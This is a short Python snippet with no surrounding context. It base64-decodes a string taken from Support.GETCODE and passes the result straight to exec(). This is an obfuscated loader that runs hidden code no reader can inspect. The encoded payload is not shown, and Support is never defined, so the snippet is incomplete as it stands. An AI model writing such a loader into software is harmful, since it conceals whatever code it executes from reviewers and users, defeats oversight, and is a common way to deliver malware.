
import os
import base64

decoded_bytes = base64.b64decode(Support.GETCODE)
decoded_code = decoded_bytes.decode('utf-8')
exec(decoded_code)
